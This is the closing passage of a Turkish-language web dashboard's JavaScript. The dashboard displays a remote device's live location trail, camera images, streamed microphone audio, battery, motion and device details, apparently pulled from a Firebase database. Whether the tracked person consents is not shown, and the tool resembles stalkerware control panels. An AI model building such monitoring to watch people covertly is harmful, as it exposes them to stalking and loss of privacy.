                document.getElementById('speedDisplay').textContent = speed ? Math.round(speed * 3.6) : '0';
                document.getElementById('distanceDisplay').textContent = totalDistance || 0;
                document.getElementById('altDisplay').textContent = altitude ? Math.round(altitude) : '--';
                document.getElementById('headingDisplay').textContent = heading ? Math.round(heading) : '--';
                document.getElementById('updateDisplay').textContent = updateCount || 0;
                document.getElementById('statusTime').textContent = new Date(timestamp).toLocaleTimeString('tr-TR');

                document.getElementById('mapInfoCoords').textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
                document.getElementById('mapInfoTime').textContent = new Date(timestamp).toLocaleTimeString('tr-TR');

                this.updateMarker(lat, lng);
                this.addToRoute(lat, lng);

                if (this.routePoints.length === 1 || this.followMode) this.centerMap();
            }

            updateMarker(lat, lng) {
                const latlng = [lat, lng];

                if (!this.marker) {
                    const icon = L.divIcon({
                        html: '<div class="marker-wrapper"><div class="marker-pulse"></div><div class="marker-dot"></div></div>',
                        className: 'custom-marker',
                        iconSize: [50, 50],
                        iconAnchor: [25, 25]
                    });
                    this.marker = L.marker(latlng, { icon }).addTo(this.map);
                } else {
                    this.marker.setLatLng(latlng);
                }
            }

            addToRoute(lat, lng) {
                const last = this.routePoints[this.routePoints.length - 1];
                if (last && Math.abs(last[0] - lat) < 0.00001 && Math.abs(last[1] - lng) < 0.00001) return;
                this.routePoints.push([lat, lng]);
                this.polyline.setLatLngs(this.routePoints);
            }

            updateCamera(data) {
                const img = document.getElementById('cameraImage');
                const placeholder = document.getElementById('cameraPlaceholder');
                img.src = data.image;
                img.style.display = 'block';
                placeholder.style.display = 'none';
                document.getElementById('cameraTime').textContent = new Date(data.timestamp).toLocaleTimeString('tr-TR');
            }

            updateBattery(data) {
                const badge = document.getElementById('batteryBadge');
                const level = document.getElementById('batteryLevel');
                const charging = document.getElementById('chargingStatus');

                const text = data.level + '%' + (data.charging ? ' ‚ö°' : '');
                badge.textContent = text;
                level.textContent = text;
                charging.textContent = data.charging ? '≈ûarj Oluyor' : '≈ûarj Olmuyor';

                badge.className = 'badge ' + (data.level < 20 && !data.charging ? 'badge-danger' : 'badge-success');
            }

            updateMotion(data) {
                const badge = document.getElementById('motionBadge');
                const status = document.getElementById('motionStatus');
                const magnitude = document.getElementById('motionMagnitude');

                if (data.isMoving) {
                    badge.textContent = 'Hareket';
                    badge.className = 'badge badge-warning';
                    status.textContent = 'Hareket Halinde';
                } else {
                    badge.textContent = 'Duraƒüan';
                    badge.className = 'badge badge-success';
                    status.textContent = 'Duraƒüan';
                }
                
                magnitude.textContent = data.magnitude || 0;
            }

            updateAudioLevel(data) {
                const level = data.level || 0;
                document.getElementById('audioMeter').style.width = level + '%';
                document.getElementById('audioLevel').textContent = level + '%';
            }

            updateDeviceInfo(data) {
                document.getElementById('devicePlatform').textContent = data.platform || '--';
                document.getElementById('deviceBrowser').textContent = data.browser || '--';
                document.getElementById('deviceScreen').textContent = data.screen || '--';
                document.getElementById('deviceConnection').textContent = data.connection || '--';
                document.getElementById('deviceLanguage').textContent = data.language || '--';
            }

            updateHistory(data) {
                const container = document.getElementById('historyList');
                container.innerHTML = '';

                Object.values(data).reverse().slice(0, 20).forEach(item => {
                    const div = document.createElement('div');
                    div.className = 'history-item';
                    div.innerHTML = `
                        <span class="history-time">${new Date(item.timestamp).toLocaleTimeString('tr-TR')}</span>
                        <span class="history-coords">${item.lat.toFixed(5)}, ${item.lng.toFixed(5)}</span>
                    `;
                    div.addEventListener('click', () => this.map.setView([item.lat, item.lng], 17));
                    container.appendChild(div);
                });
            }

            handleAudioData(base64Data) {
                this.audioQueue.push(base64Data);
                while (this.audioQueue.length > 5) this.audioQueue.shift();
                if (this.isPlaying && !this.currentAudio) this.playNextAudio();
            }

            toggleAudio() {
                const btn = document.getElementById('playAudioBtn');
                
                if (this.isPlaying) {
                    this.isPlaying = false;
                    if (this.currentAudio) { this.currentAudio.pause(); this.currentAudio = null; }
                    this.audioQueue = [];
                    btn.textContent = 'üîä';
                    btn.classList.remove('playing');
                } else {
                    this.isPlaying = true;
                    btn.textContent = 'üîá';
                    btn.classList.add('playing');
                    this.playNextAudio();
                }
            }

            playNextAudio() {
                if (!this.isPlaying || this.audioQueue.length === 0) { this.currentAudio = null; return; }

                const audioData = this.audioQueue.shift();
                
                try {
                    this.currentAudio = new Audio(audioData);
                    this.currentAudio.volume = this.volume;
                    this.currentAudio.onended = () => { this.currentAudio = null; setTimeout(() => this.playNextAudio(), 50); };
                    this.currentAudio.onerror = () => { this.currentAudio = null; setTimeout(() => this.playNextAudio(), 100); };
                    this.currentAudio.play().catch(() => { this.currentAudio = null; setTimeout(() => this.playNextAudio(), 100); });
                } catch (e) {
                    this.currentAudio = null;
                    setTimeout(() => this.playNextAudio(), 100);
                }
            }

            capturePhoto() {
                const img = document.getElementById('cameraImage');
                if (!img.src) return;
                const link = document.createElement('a');
                link.download = `capture_${Date.now()}.jpg`;
                link.href = img.src;
                link.click();
            }

            centerMap() {
                if (this.routePoints.length > 0) {
                    this.map.setView(this.routePoints[this.routePoints.length - 1], 17, { animate: true });
                }
            }

            clearRoute() {
                if (confirm('Rota ge√ßmi≈üi silinsin mi?')) {
                    this.routePoints = [];
                    this.polyline.setLatLngs([]);
                    document.getElementById('historyList').innerHTML = '<p style="color: var(--text-secondary); font-size: 0.85rem; text-align: center; padding: 20px;">Hen√ºz konum verisi yok</p>';
                    db.ref('devices/' + this.code + '/history').remove();
                }
            }
        }

        new Dashboard();
    </script>
</body>
</html>
